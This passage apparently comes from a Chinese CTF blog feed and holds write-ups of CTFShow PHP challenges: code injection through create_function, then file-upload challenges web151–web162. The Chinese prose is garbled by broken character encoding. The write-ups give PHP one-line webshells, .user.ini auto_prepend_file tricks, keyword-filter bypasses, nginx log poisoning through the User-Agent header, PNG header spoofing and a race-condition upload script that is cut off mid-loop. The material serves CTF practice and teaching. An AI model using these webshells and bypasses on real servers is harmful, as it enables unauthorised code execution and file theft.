<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>åˆ©ç”¨å§¿åŠ¿ ?xx=;}phpinfo();/* or ;}phpinfo();?&gt;</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.;&#125;phpinfo();<span class="comment">/*; </span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>;}é—­åˆäº†ä»£ç ï¼Œ/* æ³¨é‡Šæ‰åé¢çš„ä»£ç ï¼Œè‹¥éƒ¨æ³¨é‡Šå°†ä¸èƒ½æ­£å¸¸è§£æä»£ç ä»è€Œå¯¼è‡´ä¸èƒ½è¿è¡Œã€‚</p>
</li>
<li><p>?&gt; åŒç†å¯å¾—ï¼Œç›´æ¥ç»“æŸphpä»£ç ã€‚</p>
</li>
<li><p>payload</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?action=%<span class="number">5</span>ccreate_function&amp;arg=;&#125;phpinfo();<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web684_1.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºpayloadæ‰§è¡ŒæˆåŠŸã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?action=%<span class="number">5</span>ccreate_function&amp;arg=;&#125;system(<span class="string">&#x27;cat /secret_you_never_know&#x27;</span>);<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/02/04/CTFShow-%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/web684_2.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºæ‹¿åˆ°äº† flag.</p>
<p><strong>å°èŠ‚:</strong></p>
<ul>
<li>create_function çš„ä½¿ç”¨ã€‚</li>
<li>%5c ç»•è¿‡æ­£åˆ™åŒ¹é…ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow-æ–‡ä»¶ä¸Šä¼ </title>
    <url>/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1 id="CTFShow-æ–‡ä»¶ä¸Šä¼ "><a href="#CTFShow-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="CTFShow æ–‡ä»¶ä¸Šä¼ "></a>CTFShow æ–‡ä»¶ä¸Šä¼ </h1><h2 id="web151"><a href="#web151" class="headerlink" title="web151"></a>web151</h2><span id="more"></span>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151.png"></p>
<p>å…ˆæ¥ä¸Šä¼ ä¸€å¼ æ­£å¸¸å›¾ç‰‡å‘ç°ä¸èƒ½ä¸Šä¼ jpgæ ¼å¼ï¼Œå¯ä»¥ä¸Šä¼ pngæ ¼å¼.å¹¶è¿”å›äº†ä¸Šä¼ è·¯å¾„: /upload/2.png</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
<p>ä½¿ç”¨ Burp æŠ“åŒ…å°†ä¸€å¥è¯å›¾ç‰‡æ›´æ”¹åç¼€ä¸º.php ,å¹¶æˆåŠŸè¿”å›äº†ä¸Šä¼ è·¯å¾„ /upload/yjh.php</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_2.png"></p>
<p>èšå‰‘è¿æ¥ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_3.png"></p>
<p>æˆåŠŸåœ¨ä¸Šä¸€çº§ç›®å½•ä¸­æ‰¾åˆ°äº†flag<br><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_4.png"></p>
<p>ä¹Ÿå¯ä»¥ä¸ç”¨èšå‰‘ï¼Œç›´æ¥è®¿é—®ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶post ä¼ å…¥ ä¸€å¥è¯æœ¨é©¬çš„å¯†ç =ä½ æƒ³æ„é€ çš„è¯­å¥ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_5.png"></p>
<h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h2><p>åç«¯æ ¡éªŒè¦ä¸¥å¯†</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152.png"></p>
<p>ä¸Šä¼ å›¾ç‰‡é©¬:<?php eval($_POST[mm]);?> å¹¶æŠ“åŒ…ä¿®æ”¹åç¼€</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_1.png"></p>
<p>å¯è§ä¸Šä¼ æˆåŠŸï¼Œä¼¼ä¹å’Œweb151ä¸€æ ·ï¼Œèšå‰‘è¿æ¥æˆ–è®¿é—®è¯•è¯•</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_2.png"></p>
<p>å½“å‰ç›®å½•æ²¡æœ‰ï¼Œå†è¯•è¯•ä¸Šä¸€çº§ç›®å½•ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_3.png"></p>
<p>è¿˜æ˜¯åœ¨ä¸Šä¸€çº§ç›®å½•ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web152_4.png"></p>
<h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153.png"></p>
<p>ä»ç„¶ä¸€æ ·çš„é¡µé¢</p>
<p>ç»§ç»­web152çš„å¥—è·¯è¯•è¯•</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_1.png"></p>
<p>æ˜¾ç¤ºå†…å®¹ä¸º æ–‡ä»¶ç±»å‹ä¸å’Œè§„ï¼Œé‚£è‚¯å®šæ˜¯å¯¹å†™å…¥çš„å†…å®¹è¿›è¡Œäº†è¿‡æ»¤ã€‚ä½†æ˜¯ä¸çŸ¥é“è¿‡æ»¤äº†å“ªäº›å†…å®¹ã€‚</p>
<p>è¿™é¢˜æ¶‰åŠåˆ°äº†ä¸€ä¸ªæ–°çš„å†…å®¹ï¼š .user.ini æ–‡ä»¶ï¼šç®€å•æ¥è¯´æ˜¯ç”¨æˆ·å¯¹ç¯å¢ƒçš„é…ç½®æ–‡ä»¶ã€‚</p>
<p>å…ˆä¸Šä¼  .user.ini.png æ–‡ä»¶ï¼ŒæŠ“åŒ…åˆ é™¤.pngåç¼€</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a <span class="comment">// æ–‡ä»¶æ ¼å¼ï¼Œå‘ŠçŸ¥ç³»ç»Ÿè¿™æ˜¯ GIF89aæ ¼å¼ç”Ÿæˆå›¾å½¢</span></span><br><span class="line">auto_prepend_file=yjh.png <span class="comment">// è¦æ‰§è¡Œçš„æ–‡ä»¶åç§°,å°†yjh.pngå½“ä½œPhp æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
<p>å†ä¸Šä¼  yjh.pngæœ¨é©¬</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_3.png"></p>
<p>è®¿é—® /upload/index.php æ–‡ä»¶</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_4.png"></p>
<h2 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154.png"></p>
<p>ä»ç„¶ä¸€æ ·çš„é¡µé¢</p>
<p>æ³¨æ„å’Œå‰é¢ä¸€æ ·éœ€è¦ä¸Šä¼   .user.ini æ–‡ä»¶æ‰èƒ½å°† pngè§£æä¸º php æ–‡ä»¶ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
<p>ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ yjh.png : </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_1.png"></p>
<p>é¡µé¢æ˜¾ç¤ºï¼šæ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼Œå¤±è´¥åŸå› ï¼šæ–‡ä»¶å†…å®¹ä¸åˆè§„ã€‚</p>
<p>é‚£ä¹ˆå¯èƒ½å¯¹æ–‡ä»¶å†…å®¹åšäº†è¿‡æ»¤ï¼Œè¯•è¯•PHPçŸ­æ ‡ç­¾ï¼Œphpæœ‰å¾ˆå¤šçŸ­æ ‡ç­¾ä½†æ˜¯åªæœ‰ </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>(xxx)<span class="meta">?&gt;</span>  = <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (xxx)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p> è¿™ç§å½¢å¼çš„ä½¿ç”¨ä¸å—PHPé…ç½®çš„é™åˆ¶ï¼Œå…¶å®ƒå‡ ç§å½¢å¼éœ€è¦PHPå¼€å¯ä»€ä¹ˆä»€ä¹ˆæ‰èƒ½ï¼Œä¸ä½œå±•ç¤ºï¼Œè®°ä¸åˆ°äº†ã€‚æˆ‘å»ºè®®ä»¥åç›´æ¥å†™è¿™ç§çŸ­æ ‡ç­¾çš„å½¢å¼ã€‚</p>
<p>ä¿®æ”¹ yjh.png çš„å†…å®¹ä¸º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_post</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ä¿®æ”¹åçš„ä¸Šä¼ æˆåŠŸï¼Œå¹¶æˆåŠŸè¿”å›ä¸Šä¼ è·¯å¾„ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web154_2.png"></p>
<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p>ä¸Šä¼ ç•Œé¢ä»ç„¶ä¸€æ ·ï¼</p>
<p>ç»§ç»­web154å¾—å¥—è·¯è¯•è¯•:</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
<p>å…ˆä¸Šä¼  .user.ini æ–‡ä»¶ å†ä¸Šä¼  yjh.png</p>
<p>yjh.png : </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web155.png"></p>
<p>ä¸Šä¼ æˆåŠŸï¼èšå‰‘è¿æ¥æˆ–è€… è®¿é—® /upload/index.php æ–‡ä»¶</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web151_1.png"></p>
<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>ä¸Šä¼ ç•Œé¢ä»ç„¶ä¸€æ ·ï¼</p>
<p>ç»§ç»­web154å¾—å¥—è·¯è¯•è¯•:</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web153_2.png"></p>
<p>å…ˆä¸Šä¼  .user.ini æ–‡ä»¶ å†ä¸Šä¼  yjh.png</p>
<p>yjh.png : </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[mm]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156.png"></p>
<p>å“¦è±ï¼Œæ–‡ä»¶å†…å¿ƒä¸åˆè§„ï¼Œçœ‹æ¥åˆæ˜¯å¯¹ä»€ä¹ˆå­—ç¬¦è¿›è¡Œäº†è¿‡æ»¤ã€‚è¯•è¯•ä¹‹åå‘ç° æŠŠ ä¸­æ‹¬å· [] ç»™å¹²æ²¡äº†ï¼Œæ¢æˆå¤§æ‹¬å· {}</p>
<p>yjh.png</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;mm&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_1.png"></p>
<p>ä¸Šä¼ æˆåŠŸï¼èšå‰‘è¿æ¥æˆ–è€… è®¿é—® /upload/index.php æ–‡ä»¶</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web156_2.png"></p>
<h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>ç»§ç»­ä¹‹å‰å¾—å¥—è·¯å…ˆä¸Šä¼  .user.ini æ–‡ä»¶ï¼Œå†ä¼ ä¸€å¥è¯åˆè¿‡æ»¤äº†å…¶ä»–å­—ç¬¦ï¼Œé‚£å°±ä¸è¦ä¸€å¥è¯ï¼Œç›´æ¥ tac ../*</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;tac ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web157.png"></p>
<p>è®¿é—® /upload/index.php æ–‡ä»¶</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web157_1.png"></p>
<p>å¦‚å›¾å¾—åˆ° flag, åŒæ—¶ ç¬¬äºŒä¸ªçº¢æ¡† ä¹Ÿæ˜¾ç¤ºå‡ºäº†è¿‡æ»¤äº†å“ªäº›å­—ç¬¦ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;/i&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>å®Œå…¨å¯ä»¥ä½¿ç”¨ web157ä¸­çš„æ–¹æ³•å¾—åˆ° flag</p>
<p>æœ€åå¾—åˆ°è¿‡æ»¤äº† :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;|log/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>ä»ç„¶å’Œä¹‹å‰å…ˆä¸Šä¼  .user.ini å†ä¸Šä¼ yjh.png</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;cat ../*&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶æ˜¾ç¤º ä¸Šä¼ ç±»å‹ä¸åˆè§„ï¼Œåœ¨ä¸Šä¸€é¢˜çŸ¥é“ è¿‡æ»¤äº† php, {, [, ;, log é‚£è¿™é‡Œå¯èƒ½è¿‡æ»¤äº† systemå‡½æ•°ï¼Œæ¢æˆå…¶ä»–è¯•è¯•ï¼špassthru, passthruä¹Ÿä¸å¯¹ï¼Œé‚£å¯èƒ½æŠŠå°æ‹¬å·è¿‡æ»¤äº†ã€‚</p>
<p>å¯ä»¥ä½¿ç”¨ åå¼•å· `` PHP å°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›, åå¼•å·ä¸ shell_exec()å‡½æ•°åŠŸèƒ½ä¸€æ ·ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`nl ..<span class="comment">/*`?&gt;</span></span><br><span class="line"><span class="comment">// tac, cat ,nl, less, ç­‰ç­‰</span></span><br><span class="line"><span class="comment">// nl éœ€è¦æŸ¥çœ‹æºä»£ç </span></span><br></pre></td></tr></table></figure>

<p>è®¿é—® /upload/index.php</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web159.png"></p>
<p>é¡µé¢æœ€åå¯ä»¥çœ‹åˆ°ç¡®å®è¿‡æ»¤äº†å°æ‹¬å· (</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web159_1.png"></p>
<h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>ç»§ç»­ä½¿ç”¨ web159ä¸­ çš„æ–¹æ³•å¤±è´¥ï¼Œæ˜¾ç¤º æ–‡ä»¶ç±»å‹ä¸åˆè§„</p>
<p>è¿™åˆä¸çŸ¥é“è¿‡æ»¤äº†äº›ä»€ä¹ˆä¸œä¸œã€‚éš¾æã€‚ä¸æŸ¥ä¸çŸ¥é“ï¼Œä¸€æŸ¥å±…ç„¶ç”¨nginxçš„æ—¥å¿—åŒ…å«æ¥è¯»å–flag</p>
<p>é¦–å…ˆè¿˜æ˜¯å…ˆä¸Šä¼  .user.ini æ–‡ä»¶ï¼Œæ–¹æ³•å†…å®¹ä¸å˜ã€‚</p>
<p>å†ä¸Šä¼  yjh.png: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&quot;/var/lo&quot;</span>.g.<span class="string">&quot;/nginx/access.lo&quot;</span>.<span class="string">&quot;g&quot;</span><span class="meta">?&gt;</span> <span class="comment">// log è¢«è¿‡æ»¤äº†ï¼Œç”¨ . ï¼ˆç‚¹å·ï¼‰æ‹¼æ¥</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—® /upload/index.php å°†å¾—åˆ° æœåŠ¡å™¨æ—¥å¿—ä¿¡æ¯:</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160.png"></p>
<p>æ—¥å¿—æˆåŠŸè¯»å–äº†ï¼Œæ¥ä¸‹æ¥ ä¿®æ”¹ User-Agentçš„å†…å®¹ä¸º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;tac ../*&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹ User-Agentï¼šä¸º php ä»£ç ï¼Œå†è®¿é—®æ—¥å¿—å°†ä¼šæ‰§è¡Œè¿™è¡Œä»£ç !</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160_1.png"></p>
<p>å¦‚å›¾åœ¨ç½‘é¡µæ ¹ç›®å½•ä¸‹ä¿®æ”¹ï¼Œå†è®¿é—® upload/index.php</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web160_2.png"></p>
<p>å¦‚å›¾å¾—åˆ° flag, æ¥çœ‹çœ‹åˆ°åº•è¿‡æ»¤äº†ä»€ä¹ˆå†…å®¹:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> !preg_match(<span class="string">&#x27;/php|\&#123;|\[|\;|log|\(| |\`/i&#x27;</span>, <span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±å¤šè¿‡æ»¤äº†ç©ºæ ¼ï¼Œåå¼•å·ï¼Œæ‰€ä»¥ï¼Œé€šè¿‡æ—¥å¿—çš„æ–¹å¼å‰é¢å‡ é¢˜åº”è¯¥ä¹Ÿå¯ä»¥æˆåŠŸï¼Œæ‰€ä»¥ï¼Œè¿™ç§æ–¹æ³•è¦è®°ä½ï¼</p>
<h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>ä¸Šä¼ ç•Œé¢ä»ç„¶æ²¡å˜ã€‚è¿˜æ˜¯è¯•è¯•ä¹‹å‰çš„æ–¹æ³•ï¼Œå…ˆä¸Šä¼  .user.ini æ–‡ä»¶ã€‚</p>
<p>web160ä¸­çš„æ–¹æ³•å¤±è´¥äº†ï¼Œæç¤º æ–‡ä»¶ç±»å‹ä¸åˆè§„ï¼Œè¿™è‚¯å®šåˆè¿‡æ»¤äº†å…¶å®ƒå­—ç¬¦ã€‚çœ‹äº†wpæ‰çŸ¥é“ï¼Œè¿™æ—¶ä½¿ç”¨äº† getimagesize()å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šæ£€æµ‹å›¾ç‰‡çš„åå…­è¿›åˆ¶æ•°æ¥åˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯çœŸæ­£çš„å›¾ç‰‡æ–‡ä»¶ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161.png"></p>
<p>å…ˆæ¥çœ‹çœ‹æ­£å¸¸çš„ png å›¾ç‰‡çš„æ˜¯æ€æ ·çš„,winhexæ‰“å¼€å›¾ç‰‡ï¼Œä¸‹è½½è¿æ¥:<a href="http://www.winhex.com/winhex.zip">http://www.winhex.com/winhex.zip</a></p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_2.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºæ˜¾ç¤ºä¸º: <strong>89 50 4E 47 0D 0A 1A 0A</strong></p>
<p>å› æ­¤éœ€è¦å°† åŸæ¥çš„yjh æ·»åŠ è¿™ä¸²åå…­è¿›åˆ¶æ•°æ¥è¡¨ç¤ºæ˜¯æ­£å¸¸çš„pngå›¾ç‰‡ï¼</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_3.png"></p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_4.png"></p>
<p>å¦‚ä¸Šå›¾æˆåŠŸä¸Šä¼ ä¿®æ”¹åçš„yjh.pngæ–‡ä»¶ã€‚</p>
<p>ç°åœ¨è®¿é—® <a href="http://43999a00-fa05-4fa9-9215-5c1fdf53bd63.challenge.ctf.show:8080/upload/index.php">http://43999a00-fa05-4fa9-9215-5c1fdf53bd63.challenge.ctf.show:8080/upload/index.php</a></p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_5.png"></p>
<p>æˆåŠŸå¾—åˆ°æ—¥å¿—æ–‡ä»¶</p>
<p>æ¥ä¸‹æ¥ ä¿®æ”¹ User-Agent ä¸º ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;cat ../*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—® upload/index.php å³å¯æŸ¥çœ‹åˆ°ä¸Šä¸€çº§ç›®å½•ä¸­çš„æ‰€æœ‰å†…å®¹ï¼ŒåŒæ—¶è¿‡æ»¤äº†ä»€ä¹ˆä¸œè¥¿ä¹Ÿæ˜¾ç¤ºå‡ºæ¥äº†ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_6.png"></p>
<p>è¿‡æ»¤çš„å†…å®¹ï¼š</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web161_7.png"></p>
<p>å¦‚å›¾ï¼šæ­£åˆ™çš„è¿‡æ»¤è·Ÿä¸Šä¸€é¢˜æ¯”è¾ƒæ²¡æœ‰å˜ï¼Œè€Œæ˜¯åœ¨ æ–‡ä¸­ å¢åŠ äº† getimagesize() å‡½æ•°ï¼</p>
<h2 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h2><p>è¿™é“é¢˜ï¼Œè¦åˆ©ç”¨seeiionæ¡ä»¶ç«äº‰ï¼Œåœ¨å‰é¢ **web82 **ä¸­æœ‰ç”¨åˆ°è¿‡æ­¤æ–¹æ³•ã€‚ä¸”è¿‡æ»¤äº† å°æ•°ç‚¹ å·ã€‚</p>
<p>å…ˆä¸Šä¼  .user.ini å†…å®¹ä¸º:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=test</span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162.png"></p>
<p>ä¹‹å‰æ˜¯è¯»å– log æ–‡ä»¶ï¼Œè¿™æ¬¡ è¯»å– .user.ini ä¸­çš„ test</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_1.png"></p>
<p>ä¸Šè„šæœ¬: session.py:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessID = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://4aee5c93-e165-4911-bcc0-4c7d1b6961b8.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>) </span><br><span class="line">        response = session.post(</span><br><span class="line">            url,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,</span><br><span class="line">            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;cat ../*&quot;);?&gt;&#x27;</span>&#125;, <span class="comment"># æ³¨æ„</span></span><br><span class="line">            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> event.isSet():</span><br><span class="line">        response = session.get(url + <span class="string">&#x27;/upload/index.php&#x27;</span>) <span class="comment"># æ³¨æ„</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    event.<span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> 